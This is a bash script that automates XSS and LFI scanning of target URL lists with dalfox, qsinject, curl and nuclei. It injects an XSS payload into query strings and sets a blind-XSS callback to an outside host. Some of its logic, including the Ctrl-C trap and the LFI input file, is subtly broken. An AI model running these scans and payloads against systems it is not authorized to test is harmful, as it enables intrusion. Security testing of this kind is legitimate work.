#!/bin/bash
#title:         JOD-XLR8.sh
#description:   Automated and Modular Shell Script to Automate Security Vulnerability Scans
#author:        R12W4N
#version:       1.0.1
#==============================================================================
RED=`tput setaf 1`
GREEN=`tput setaf 2`
YELLOW=`tput setaf 3`
BLUE=`tput setaf 4`
MAGENTA=`tput setaf 5`
CYAN=`tput setaf 6`
RESET=`tput sgr0`
WBOLD=`tput bold 7`
WUL=`tput smul`


function trap_ctrlc ()
{
    echo "Ctrl-C caught...performing clean up"

    echo "Doing cleanup"
    trap "kill 0" EXIT
    exit 2
}

trap "trap_ctrlc" 4

####Add Functions Here
xfilechecker(){
    echo "${BLUE}File is empty... Skipping${RESET}"
    return 1
}


function xssdalfoxss(){
    xsshturl=https://pipiwa.xss.ht

    [ -d $tmpdir ] && echo "$tmpdir Directory Exists" || mkdir -p $tmpdir
    [ -d $results ] && echo "$results Directory Exists" || mkdir -p $results

    find $project -type f -name xss.txt > $tmpdir/allxssf
    [ -s $tmpdir/allxssf ] && echo "${BLUE}Running Dalfox${RESET}" || xfilechecker
    while IFS= read line
        do 
            cat $line | sed 's/=.*/=/' | sed 's/URL: //' | tee $tmpdir/testxss
            dalfox file  $tmpdir/testxss -b $xsshturl -o $results/dalfox.txt
        done < "$tmpdir/allxssf"
}

function xssqsinjector(){
    [ -d $tmpdir ] && echo "$tmpdir Directory Exists" || mkdir -p $tmpdir
    [ -d $results ] && echo "$results Directory Exists" || mkdir -p $results
    
    find $project -type f -name xss.txt > $tmpdir/allxssf
    [ -s $tmpdir/allxssf ] && echo "${BLUE}Running with payload manually${RESET}" || xfilechecker
    
    while IFS= read line
        do 
            cat $line | qsinject -i '"><script>confirm(1)</script>' -iu -decode >> $tmpdir/qsinjectall
        done < "$tmpdir/allxssf"
    
    while IFS= read urlwp
        do
            curl --silent --path-as-is --insecure "$urlwp" | grep -qs "<script>confirm(1)" && echo ${RED}Vulnerable${RESET} $urlwp && echo "$urlwp" >> $results/qsinjected-poc.txt
        done <"$tmpdir/qsinjectall"
}


function lfinuclei(){
    [ -d $tmpdir ] && echo "$tmpdir Directory Exists" || mkdir -p $tmpdir
    [ -d $results ] && echo "$results Directory Exists" || mkdir -p $results

    find $project -type f -name lfi.txt > $tmpdir/all-lfi
    [ -s $tmpdir/all-lfi ] && echo "${BLUE}Running Nuclei LFI Template from Config${RESET}" || xfilechecker
    while IFS= read lfif
        do 
            echo "${MAGENTA}Running on $lfif  ${RESET}"
        done < "$tmpdir/all-lfi"
    nuclei -l $tmpdir/lfip -t config/lfi.yaml -timeout 7 -silent -nc -o $results/lfipoc.txt
}

#Menu options
options[0]="XSS-Dalfoxss"
options[1]="XSS-QSInjector"
options[2]="LFI-Nuclei"

#Variables
ERROR=" "

#Clear screen for menu
clear

#Menu function
function MENU {
    echo "Menu Options"
    for NUM in ${!options[@]}; do
        echo "[""${choices[NUM]:- }""]" $(( NUM+1 ))") ${options[NUM]}"
    done
    echo "$ERROR"
}

#Menu loop
while MENU && read -e -p "Select the desired options using their number (again to uncheck, ENTER when done): " -n1 SELECTION && [[ -n "$SELECTION" ]]; do
    clear
    if [[ "$SELECTION" == *[[:digit:]]* && $SELECTION -ge 1 && $SELECTION -le ${#options[@]} ]]; then
        (( SELECTION-- ))
        if [[ "${choices[SELECTION]}" == "+" ]]; then
            choices[SELECTION]=""
        else
            choices[SELECTION]="+"
        fi
            ERROR=" "
    else
        ERROR="Invalid option: $SELECTION"
    fi
done

#Actions to take based on selection
function ACTIONS {

    if [[ ${choices[0]} ]]; then
        echo "[1] Running XSS-Dalfox"
	    xssdalfoxss
    fi
    if [[ ${choices[1]} ]]; then
        echo "[2] Running XSS-QsInjector"
        xssqsinjector
    fi
    if [[ ${choices[2]} ]]; then
        echo "[2] Running LFI-Nuclei"
        lfinuclei
    fi

}


projectdirectorycheck(){
    read -p "${RED}Project Name: ${RESET}" project
    echo $project

    if [ -d $project ]
    then
        echo -e
        echo -e "[${RED}I${RESET}] $project Directory already exists...${RESET}"
    else
        mkdir -p $project
    fi
   
    tmpdir="$project/tmp"
    results="$project/results"
}


projectdirectorycheck
ACTIONS